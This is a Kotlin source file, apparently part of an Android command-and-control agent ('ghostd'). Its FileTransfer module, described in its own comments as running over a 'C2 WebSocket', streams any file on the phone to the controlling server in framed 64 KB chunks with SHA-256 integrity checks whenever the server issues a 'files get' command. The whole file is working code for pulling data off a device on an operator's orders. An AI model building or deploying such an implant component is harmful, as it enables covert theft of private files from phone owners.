package com.tg.ghostd

import com.neovisionaries.ws.client.WebSocket
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.security.MessageDigest

/**
 * Outgoing file transfer: streams a file from the phone to the server over the
 * C2 WebSocket in 64 KB chunks, reusing the MediaBus binary framing
 * convention (UTF-8 JSON header + b'\n' + payload — same header style the
 * server already parses for media frames).
 *
 * Wire format:
 *   text:   {"type":"file_start","path":..,"dest":..,"total":N,"chunk":65536,"cmd_id":..}
 *   binary: header {"type":"file_chunk","seq":i,"path":..,"len":n,"total":N,"cmd_id":..} + \n + payload
 *   text:   {"type":"file_end","path":..,"bytes":N,"chunks":k,"sha256":hex,"cmd_id":..}
 *
 * Every frame carries cmd_id so the server can bind it to the outstanding
 * `files get` command and reject chunks from a different transfer. See
 * [FileReceiver] for the reverse direction (files put).
 */
object FileTransfer {

    const val TYPE_START = "file_start"
    const val TYPE_CHUNK = "file_chunk"
    const val TYPE_END = "file_end"
    const val CHUNK_SIZE = 64 * 1024

    // ----------------------------------------------------------- framing

    /** Number of [CHUNK_SIZE] chunks needed to carry [total] bytes. */
    fun chunkCount(total: Long, chunk: Int = CHUNK_SIZE): Long =
        if (total <= 0) 0 else (total + chunk - 1) / chunk

    /** Bytes carried by chunk [seq] (0-based) of a [total]-byte file. */
    fun chunkLen(total: Long, seq: Long, chunk: Int = CHUNK_SIZE): Int {
        if (total <= 0 || seq < 0) return 0
        val offset = seq * chunk
        if (offset >= total) return 0
        return (minOf(chunk.toLong(), total - offset)).toInt()
    }

    /** header JSON + b'\n' + payload (MediaBus framing style). */
    fun buildFrame(header: JSONObject, payload: ByteArray): ByteArray {
        val hb = header.toString().toByteArray(Charsets.UTF_8)
        val out = ByteArray(hb.size + 1 + payload.size)
        hb.copyInto(out)
        out[hb.size] = '\n'.code.toByte()
        payload.copyInto(out, hb.size + 1)
        return out
    }

    /**
     * Parse a framed binary message: JSON header (up to the first b'\n') +
     * payload. Returns null when the message is not framed (no newline, or
     * the header is not JSON).
     */
    fun parseFrame(data: ByteArray): Pair<JSONObject, ByteArray>? {
        val nl = data.indexOfFirst { it == '\n'.code.toByte() }
        if (nl <= 0) return null
        val header = try {
            JSONObject(String(data, 0, nl, Charsets.UTF_8))
        } catch (_: Exception) {
            return null
        }
        return Pair(header, data.copyOfRange(nl + 1, data.size))
    }

    // ------------------------------------------------------------ stream

    /**
     * `files get <path> [dest]`: stream [path] to the server; [dest] is an
     * opaque remote save-name hint echoed in the headers. Returns
     * {path, dest, bytes, chunks, sha256}.
     */
    fun sendFile(ws: WebSocket, path: String, cmdId: String, dest: String?): JSONObject =
        sendFile(
            path, cmdId, dest,
            sendText = { text -> ws.sendText(text) },
            sendBinary = { data -> ws.sendBinary(data) }
        )

    /**
     * Testable core of [sendFile]; the WebSocket overload above passes its
     * own send methods. Kept internal so unit tests can capture every frame
     * without a live socket.
     */
    internal fun sendFile(
        path: String,
        cmdId: String,
        dest: String?,
        sendText: (String) -> Unit,
        sendBinary: (ByteArray) -> Unit
    ): JSONObject {
        val f = File(path)
        if (!f.exists() || !f.isFile) throw Exception("no such file: $path")
        if (!f.canRead()) throw Exception("cannot read: $path")
        val total = f.length()
        val chunks = chunkCount(total)
        val start = JSONObject()
            .put("type", TYPE_START)
            .put("path", path)
            .put("dest", dest ?: path)
            .put("total", total)
            .put("chunk", CHUNK_SIZE)
            .put("chunks", chunks)
            .put("cmd_id", cmdId)
        try {
            sendText(start.toString())
        } catch (e: Exception) {
            throw Exception("socket gone before file_start: ${e.message}")
        }
        val digest = MessageDigest.getInstance("SHA-256")
        var seq = 0L
        val buf = ByteArray(CHUNK_SIZE)
        FileInputStream(f).use { ins ->
            while (true) {
                val n = ins.read(buf)
                if (n <= 0) break
                val payload = if (n == buf.size) buf else buf.copyOf(n)
                val header = JSONObject()
                    .put("type", TYPE_CHUNK)
                    .put("seq", seq)
                    .put("path", path)
                    .put("len", n)
                    .put("total", total)
                    .put("cmd_id", cmdId)
                try {
                    sendBinary(buildFrame(header, payload))
                } catch (e: Exception) {
                    throw Exception("socket gone at chunk $seq: ${e.message}")
                }
                digest.update(payload)
                seq++
            }
        }
        val sha256 = toHex(digest.digest())
        val end = JSONObject()
            .put("type", TYPE_END)
            .put("path", path)
            .put("dest", dest ?: path)
            .put("bytes", total)
            .put("chunks", seq)
            .put("sha256", sha256)
            .put("cmd_id", cmdId)
        try {
            sendText(end.toString())
        } catch (_: Exception) {
            // socket gone after the last chunk; the result send will fail too
        }
        return JSONObject()
            .put("path", path)
            .put("dest", dest ?: path)
            .put("bytes", total)
            .put("chunks", seq)
            .put("sha256", sha256)
    }

    fun toHex(bytes: ByteArray): String {
        val sb = StringBuilder(bytes.size * 2)
        for (b in bytes) sb.append("%02x".format(b))
        return sb.toString()
    }
}
